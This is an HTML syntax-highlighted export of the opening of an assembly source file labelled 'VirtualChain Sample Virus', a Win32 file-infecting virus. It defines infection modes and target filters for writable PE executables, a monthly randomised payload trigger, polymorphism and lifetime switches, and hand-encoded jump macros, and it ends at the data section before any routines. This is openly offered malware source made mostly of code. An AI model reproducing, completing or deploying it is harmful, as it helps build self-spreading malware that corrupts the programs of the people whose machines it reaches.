<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>VC.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; VirtualChain Sample Virus</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">



</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">



</span><span class="sc1">; Macros</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">; Parameters</span><span class="sc0">

</span><span class="sc1">; Modes</span><span class="sc0">
</span><span class="sc5">@_ModeOnTarget</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">; Only infects "target.exe", in current dir, in first generation.</span><span class="sc0">
</span><span class="sc5">@_ModeSandBox</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">; Only "C:\*.exe" files are look for infection.</span><span class="sc0">
</span><span class="sc5">@_ModeNoPoly</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;LifeTime</span><span class="sc0">
</span><span class="sc5">@_LifeTimeMin</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">066010100h</span><span class="sc0">
</span><span class="sc5">@_LifeTimeMax</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">067010100h</span><span class="sc0">
</span><span class="sc1">; Four one-byte fields: year-1900, month, day, hour, in this order.</span><span class="sc0">

</span><span class="sc1">;Target</span><span class="sc0">
</span><span class="sc5">@_TargetNum</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">@_TargetSelectSizeMax</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">000040000h</span><span class="sc0"> </span><span class="sc1">; = 262.144 Bytes</span><span class="sc0">
</span><span class="sc5">@_TargetSelectTimeMask</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0FFFFF800h</span><span class="sc0"> </span><span class="sc1">; Last 10 days (aprox)</span><span class="sc0">
</span><span class="sc5">@_TargetSelectRandMask</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0F0000000h</span><span class="sc0"> </span><span class="sc1">; 1/8</span><span class="sc0">
</span><span class="sc1">; Target search filters.</span><span class="sc0">
</span><span class="sc1">;  Will search for 5 Win32 PE writable files.</span><span class="sc0">
</span><span class="sc1">;  Small than 256KB, last accessed in past 10 days.</span><span class="sc0">
</span><span class="sc1">;  Requirements filled, will choose present file only 1 time of 8, in order of appearence. </span><span class="sc0">

</span><span class="sc1">;LinkPos</span><span class="sc0">
</span><span class="sc5">@_LinkSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc1">; = 018h</span><span class="sc0">
</span><span class="sc5">@_LinkPosNlj</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">@_LinkPosTrash</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc5">@_LinkPosTrashSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">@_LinkPosReloc</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc0">
</span><span class="sc1">; Link structure</span><span class="sc0">

</span><span class="sc1">;Payload</span><span class="sc0">
</span><span class="sc5">@_PayloadTimeMask</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000FF00h</span><span class="sc0">
</span><span class="sc1">; Only days are looked.</span><span class="sc0">
</span><span class="sc5">@_PayloadTime</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">000000100h</span><span class="sc0">
</span><span class="sc1">; Will activate at 1st of each month.</span><span class="sc0">
</span><span class="sc5">@_PayloadRandMask</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0F0000000h</span><span class="sc0">
</span><span class="sc1">; Will activate only 1 time of 8.</span><span class="sc0">


</span><span class="sc1">; Constants</span><span class="sc0">

</span><span class="sc5">@_ProgSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prog_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prog</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@_HeapSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@_VirusSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@_ProgSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@_HeapSize</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@_FileAligns</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">@_VirusSize</span><span class="sc4">/</span><span class="sc2">01000h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">01000h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@_SectAligns</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">@_VirusSize</span><span class="sc4">/</span><span class="sc2">01000h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">01000h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@_ChainSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@_ProgSize</span><span class="sc4">/</span><span class="sc5">@_LinkSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">@_PathSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc1">; = 00104h</span><span class="sc0">

</span><span class="sc5">@_LoadApiListSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">


</span><span class="sc1">; Functions</span><span class="sc0">

</span><span class="sc5">@@_jo</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jno</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jc</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jb</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jnae</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jnc</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jnb</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jae</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jz</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_je</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jnz</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">085h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jne</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">085h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jna</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jbe</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_ja</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jnbe</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">087h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_js</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">088h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jns</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">089h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jp</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Ah</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jpe</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Ah</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jnp</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jpo</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jl</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Ch</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jnge</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Ch</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jnl</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Dh</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jge</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Dh</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jng</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Eh</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jle</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Eh</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jg</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Fh</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@_jnle</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">08Fh</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jecxz</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">084h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;5</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_loop</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">049h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">085h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;3</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_jmp</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0"> </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc4">-</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;1</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@@_call</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">there</span><span class="sc0"> </span><span class="sc1">;1</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">



</span><span class="sc1">; Data</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

